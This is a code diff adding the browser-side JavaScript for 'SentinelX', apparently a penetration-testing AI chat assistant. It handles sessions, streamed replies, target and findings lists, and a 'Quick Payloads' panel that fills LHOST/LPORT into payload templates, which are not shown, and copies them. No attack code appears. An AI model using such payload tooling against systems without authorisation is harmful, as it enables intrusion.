+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ name: newName })
+                            });
+                        }
+                    };
+
+                    nameEl.onblur = saveRename;
+                    nameEl.onkeydown = e => {
+                        if (e.key === 'Enter') {
+                            e.preventDefault();
+                            nameEl.blur();
+                        }
+                    };
+                });
+            });
+
+            sessionList.querySelectorAll('button[data-delete]').forEach(btn => {
+                btn.addEventListener('click', e => {
+                    e.stopPropagation();
+                    deleteSession(btn.dataset.delete);
+                });
+            });
+        }
+
+        async function createSession() {
+            try {
+                const res = await fetch('/api/sessions', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({})
+                });
+                const data = await res.json();
+                currentSession = data.session_id;
+                loadSessions();
+                return data.session_id;
+            } catch (e) {
+                console.error('Failed to create session:', e);
+                return null;
+            }
+        }
+
+        async function selectSession(id) {
+            currentSession = id;
+            try {
+                const res = await fetch(`/api/sessions/${id}/messages`);
+                const data = await res.json();
+                messages = data.messages.map(m => ({ role: m.role, content: m.content }));
+                renderMessages();
+                loadSessions();
+            } catch (e) {
+                console.error('Failed to load messages:', e);
+            }
+        }
+
+        async function deleteSession(id) {
+            try {
+                await fetch(`/api/sessions/${id}`, { method: 'DELETE' });
+                if (currentSession === id) {
+                    currentSession = null;
+                    messages = [];
+                    showWelcome();
+                }
+                loadSessions();
+            } catch (e) {
+                console.error('Failed to delete session:', e);
+            }
+        }
+
+        // === Chat ===
+        function showWelcome() {
+            chatMessages.innerHTML = `
+                <div class="welcome">
+                    <div class="welcome-icon"><i class="fas fa-shield-virus"></i></div>
+                    <h2>SentinelX</h2>
+                    <p>Professional Penetration Testing AI Assistant</p>
+                    <p style="font-size: 12px; color: var(--text-dim); margin-top: 8px;">
+                        10+ years expertise in Web AppSec, Bug Bounty, Exploit Development & Network Pentesting
+                    </p>
+                    <div class="welcome-features">
+                        <div class="welcome-feature"><i class="fas fa-search"></i> Recon</div>
+                        <div class="welcome-feature"><i class="fas fa-bug"></i> Exploits</div>
+                        <div class="welcome-feature"><i class="fas fa-file-code"></i> Payloads</div>
+                        <div class="welcome-feature"><i class="fas fa-unlock-alt"></i> Post-Ex</div>
+                    </div>
+                    <div class="shortcuts-hint">
+                        <kbd>Enter</kbd> to send · <kbd>Shift+Enter</kbd> new line · <kbd>Esc</kbd> to stop
+                    </div>
+                    <p style="font-size: 11px; color: var(--text-muted); margin-top: 16px;">
+                        Created by <a href="https://github.com/cypher-21" style="color: var(--accent);">Parosh-sec</a>
+                    </p>
+                </div>
+            `;
+        }
+
+        function renderMessages() {
+            if (messages.length === 0) {
+                showWelcome();
+                return;
+            }
+
+            chatMessages.innerHTML = messages.map(m => `
+                <div class="message ${m.role}">
+                    <div class="message-avatar"><i class="fas ${m.role === 'user' ? 'fa-user' : 'fa-shield-virus'}"></i></div>
+                    <div class="message-content">${m.role === 'user' ? escapeHtml(m.content) : DOMPurify.sanitize(marked.parse(m.content))}</div>
+                </div>
+            `).join('');
+
+            addCopyButtons();
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+        }
+
+        async function sendMessage() {
+            const text = chatInput.value.trim();
+            if (!text || isStreaming) return;
+
+            // Create session if needed
+            if (!currentSession) {
+                await createSession();
+            }
+
+            // Add user message
+            messages.push({ role: 'user', content: text });
+            chatInput.value = '';
+            chatInput.style.height = 'auto';
+
+            // Clear welcome
+            const welcome = chatMessages.querySelector('.welcome');
+            if (welcome) welcome.remove();
+
+            // Render user message
+            appendMessage('user', text);
+
+            // Add assistant placeholder
+            const assistantDiv = appendMessage('assistant', '<div class="typing"><span></span><span></span><span></span></div>');
+            const contentEl = assistantDiv.querySelector('.message-content');
+
+            isStreaming = true;
+            sendBtn.disabled = true;
+            stopBtn.classList.add('visible');
+
+            // Create abort controller for fetch
+            abortController = new AbortController();
+
+            try {
+                const res = await fetch('/api/chat/stream', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        message: text,
+                        session_id: currentSession,
+                        model: modelSelect.value
+                    }),
+                    signal: abortController.signal
+                });
+
+                // Get request ID for server-side abort
+                currentRequestId = res.headers.get('X-Request-ID');
+
+                const reader = res.body.getReader();
+                const decoder = new TextDecoder();
+                let fullText = '';
+
+                contentEl.innerHTML = '';
+
+                while (true) {
+                    const { done, value } = await reader.read();
+                    if (done) break;
+
+                    fullText += decoder.decode(value, { stream: true });
+                    contentEl.innerHTML = DOMPurify.sanitize(marked.parse(fullText));
+                    chatMessages.scrollTop = chatMessages.scrollHeight;
+                }
+
+                messages.push({ role: 'assistant', content: fullText });
+                addCopyButtons();
+
+            } catch (e) {
+                if (e.name === 'AbortError') {
+                    contentEl.innerHTML += '<span style="color: var(--orange)"> [Stopped]</span>';
+                } else {
+                    contentEl.innerHTML = `<span style="color: var(--red)">Error: ${e.message}</span>`;
+                }
+            }
+
+            isStreaming = false;
+            sendBtn.disabled = false;
+            stopBtn.classList.remove('visible');
+            currentRequestId = null;
+            abortController = null;
+        }
+
+        async function stopGeneration() {
+            if (!isStreaming) return;
+
+            // Abort the fetch request
+            if (abortController) {
+                abortController.abort();
+            }
+
+            // Also tell server to stop
+            if (currentRequestId) {
+                try {
+                    await fetch('/api/chat/abort', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ request_id: currentRequestId })
+                    });
+                } catch (e) {
+                    console.error('Failed to abort on server:', e);
+                }
+            }
+
+            showToast('Generation stopped', 'success');
+        }
+
+        function appendMessage(role, content) {
+            const div = document.createElement('div');
+            div.className = `message ${role}`;
+            div.innerHTML = `
+                <div class="message-avatar"><i class="fas ${role === 'user' ? 'fa-user' : 'fa-shield-virus'}"></i></div>
+                <div class="message-content">${role === 'user' ? escapeHtml(content) : content}</div>
+            `;
+            chatMessages.appendChild(div);
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+            return div;
+        }
+
+        function addCopyButtons() {
+            chatMessages.querySelectorAll('pre').forEach(pre => {
+                if (pre.querySelector('.copy-btn')) return;
+                const btn = document.createElement('button');
+                btn.className = 'copy-btn';
+                btn.innerHTML = '<i class="fas fa-copy"></i>';
+                btn.onclick = () => {
+                    const code = pre.querySelector('code')?.textContent || pre.textContent;
+                    navigator.clipboard.writeText(code);
+                    btn.innerHTML = '<i class="fas fa-check"></i>';
+                    setTimeout(() => btn.innerHTML = '<i class="fas fa-copy"></i>', 1500);
+                };
+                pre.style.position = 'relative';
+                pre.appendChild(btn);
+            });
+        }
+
+        // === Export/Clear ===
+        async function exportChat() {
+            if (!currentSession) {
+                showToast('No conversation to export', 'error');
+                return;
+            }
+
+            window.location.href = `/api/sessions/${currentSession}/export`;
+            showToast('Exporting conversation...', 'success');
+        }
+
+        async function clearChat() {
+            if (!currentSession) {
+                showToast('No conversation to clear', 'error');
+                return;
+            }
+
+            try {
+                await fetch(`/api/sessions/${currentSession}/messages`, { method: 'DELETE' });
+                messages = [];
+                showWelcome();
+                showToast('Chat cleared', 'success');
+            } catch (e) {
+                showToast('Failed to clear chat', 'error');
+            }
+        }
+
+        // === Targets ===
+        async function loadTargets() {
+            try {
+                const res = await fetch('/api/targets');
+                const data = await res.json();
+                renderTargets(data.targets);
+            } catch (e) {
+                console.error('Failed to load targets:', e);
+            }
+        }
+
+        function renderTargets(targets) {
+            if (!targets || targets.length === 0) {
+                targetList.innerHTML = '<div class="empty-state">No targets</div>';
+                return;
+            }
+
+            targetList.innerHTML = targets.map(t => `
+                <div class="target-item">
+                    <span>${escapeHtml(t.value)}</span>
+                    <button data-id="${t.id}"><i class="fas fa-times"></i></button>
+                </div>
+            `).join('');
+
+            targetList.querySelectorAll('button').forEach(btn => {
+                btn.addEventListener('click', () => deleteTarget(btn.dataset.id));
+            });
+        }
+
+        async function addTarget() {
+            const input = document.getElementById('target-input');
+            const value = input.value.trim();
+            if (!value) return;
+
+            try {
+                await fetch('/api/targets', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ value })
+                });
+                input.value = '';
+                loadTargets();
+                showToast('Target added', 'success');
+            } catch (e) {
+                console.error('Failed to add target:', e);
+            }
+        }
+
+        async function deleteTarget(id) {
+            try {
+                await fetch(`/api/targets/${id}`, { method: 'DELETE' });
+                loadTargets();
+            } catch (e) {
+                console.error('Failed to delete target:', e);
+            }
+        }
+
+        // === Findings ===
+        async function loadFindings() {
+            try {
+                const url = currentSession ? `/api/findings?session_id=${currentSession}` : '/api/findings';
+                const res = await fetch(url);
+                const data = await res.json();
+                renderFindings(data.findings);
+            } catch (e) {
+                console.error('Failed to load findings:', e);
+            }
+        }
+
+        function renderFindings(findings) {
+            if (!findings || findings.length === 0) {
+                findingsList.innerHTML = '<div class="empty-state">No findings yet</div>';
+                return;
+            }
+
+            findingsList.innerHTML = findings.map(f => `
+                <div class="finding-item">
+                    <span class="severity ${f.severity}">${f.severity}</span>
+                    <span class="title">${escapeHtml(f.title)}</span>
+                    <button data-id="${f.id}"><i class="fas fa-times"></i></button>
+                </div>
+            `).join('');
+
+            findingsList.querySelectorAll('button').forEach(btn => {
+                btn.addEventListener('click', () => deleteFinding(btn.dataset.id));
+            });
+        }
+
+        async function addFinding() {
+            const titleInput = document.getElementById('finding-title');
+            const severitySelect = document.getElementById('finding-severity');
+            const title = titleInput.value.trim();
+            const severity = severitySelect.value;
+
+            if (!title) return;
+
+            try {
+                await fetch('/api/findings', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        session_id: currentSession,
+                        title,
+                        severity
+                    })
+                });
+                titleInput.value = '';
+                loadFindings();
+                showToast('Finding logged', 'success');
+            } catch (e) {
+                console.error('Failed to add finding:', e);
+            }
+        }
+
+        async function deleteFinding(id) {
+            try {
+                await fetch(`/api/findings/${id}`, { method: 'DELETE' });
+                loadFindings();
+            } catch (e) {
+                console.error('Failed to delete finding:', e);
+            }
+        }
+
+        // === Quick Payloads ===
+        function renderQuickPayloads() {
+            quickGrid.innerHTML = QUICK_PAYLOADS.map((p, i) => `
+                <div class="quick-card" data-idx="${i}">
+                    <h4><i class="fas fa-terminal"></i> ${p.name}</h4>
+                    <code>${escapeHtml(p.code.substring(0, 40))}...</code>
+                </div>
+            `).join('');
+
+            quickGrid.querySelectorAll('.quick-card').forEach(card => {
+                card.addEventListener('click', () => {
+                    const payload = QUICK_PAYLOADS[parseInt(card.dataset.idx)];
+                    const lhost = document.getElementById('lhost').value || 'LHOST';
+                    const lport = document.getElementById('lport').value || 'LPORT';
+                    let code = payload.code.replace(/LHOST/g, lhost).replace(/LPORT/g, lport);
+                    navigator.clipboard.writeText(code);
+                    card.querySelector('h4').innerHTML = '<i class="fas fa-check"></i> Copied!';
+                    setTimeout(() => {
+                        card.querySelector('h4').innerHTML = `<i class="fas fa-terminal"></i> ${payload.name}`;
+                    }, 1500);
+                });
+            });
+        }
+
+        // === Models ===
+        async function loadModels() {
+            try {
+                const res = await fetch('/api/models');
+                const data = await res.json();
+                modelSelect.innerHTML = (data.models || ['sentinelx']).map(m =>
+                    `<option value="${m}" ${m.includes('sentinelx') ? 'selected' : ''}>${m}</option>`
+                ).join('');
+            } catch (e) {
+                modelSelect.innerHTML = '<option value="sentinelx">sentinelx</option>';
+            }
+        }
+
+        // === Panels ===
+        function openPanel(panel) {
+            closeAllPanels();
+            panel.classList.add('open');
+            overlay.classList.add('open');
+        }
+
+        function closeAllPanels() {
+            document.querySelectorAll('.side-panel').forEach(p => p.classList.remove('open'));
+            overlay.classList.remove('open');
+        }
+
+        // === Utilities ===
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function showToast(message, type = 'success') {
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+    </script>
+</body>
+
+</html>
